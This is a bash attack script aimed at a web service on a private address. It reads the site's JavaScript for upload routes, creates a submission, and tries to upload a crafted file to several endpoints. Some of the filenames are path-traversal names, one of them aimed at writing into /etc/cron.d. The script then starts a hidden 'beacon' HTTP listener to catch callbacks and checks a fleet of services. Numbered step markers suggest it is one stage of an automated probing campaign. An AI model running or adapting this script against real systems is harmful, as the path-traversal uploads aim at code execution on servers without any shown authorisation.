#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
B=http://192.168.0.24:18086
log "### START23 $(date -u +%FT%TZ)"
timeout 25 curl -s -m 20 $B/app.js -o /tmp/app.js
log "### UPLOAD-ROUTE"
python3 - <<'PY'
import re
s=open('/tmp/app.js',encoding='utf-8',errors='replace').read()
for m in re.finditer(r'/api/submissions', s):
    seg=s[max(0,m.start()-120):m.start()+260]
    if 'file' in seg or 'upload' in seg or 'FormData' in seg:
        print('>>>', seg.replace('\n',' ')[:380])
print('--- FormData occurrences')
for m in list(re.finditer('FormData', s))[:6]:
    print('>>', s[max(0,m.start()-200):m.start()+300].replace('\n',' ')[:480])
PY
log "### CREATE-SUB"
R=$(timeout 15 curl -s -m 12 -X POST $B/api/submissions -H 'Content-Type: application/json' -d '{"nickname":"ul-t2-123-184-7-135","model":"ulprobe","description":"fanout probe"}')
log "resp=$(echo "$R" | head -c 300)"
ID=$(echo "$R" | python3 -c "import json,sys
try: print(json.load(sys.stdin).get('id',''))
except: print('')")
log "id=$ID"
log "### UPLOAD-ATTEMPTS"
printf 'PK\x03\x04' > /tmp/min.h5ad; head -c 2000 /dev/urandom >> /tmp/min.h5ad
for u in "$B/api/submissions/$ID/files/H" "$B/api/submissions/$ID/files?context=H" "$B/api/submissions/$ID/upload" "$B/api/submissions/$ID/files/H/upload" "$B/api/upload"; do
  for fn in "ul-H.h5ad" "../../../../etc/cron.d/ulb" "/tmp/ul_w24.txt"; do
    r=$(timeout 15 curl -s -m 12 -X POST "$u" -F "file=@/tmp/min.h5ad;filename=$fn" -F "context=H" -w "|%{http_code}")
    log "up $u fn=$fn -> $(echo "$r" | head -c 200 | tr '\n' ' ')"
  done
done
log "### SUB-STATE"
[ -n "$ID" ] && timeout 12 curl -s -m 10 "$B/api/submissions" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for s in d[:3]:
  if s.get('id'):
    print(s['id'],s.get('nickname'),s.get('status'),json.dumps(s.get('files'))[:300])
" 2>&1 | head -6
log "### BEACON"
pkill -f "http.server 18081" 2>/dev/null; sleep 1
( setsid nohup python3 -m http.server 18081 --bind 0.0.0.0 </dev/null >/root/ul_farmfan/beacon3.log 2>&1 & ) </dev/null >/dev/null 2>&1
sleep 2; ss -ltn 2>/dev/null | grep -c 18081
for i in $(seq 1 5); do sleep 12; n=$(grep -ac . /root/ul_farmfan/beacon3.log 2>/dev/null); log "t+$((i*12)) loglines=$n"; done
tail -c 400 /root/ul_farmfan/beacon3.log 2>/dev/null
log "### FLEET"
for i in 0 1 2 3 4 5 6 7; do printf 'g%d=%s ' $i "$(systemctl is-active ul-g$i)"; done; echo
log "### DONE23 $(date -u +%FT%TZ)"
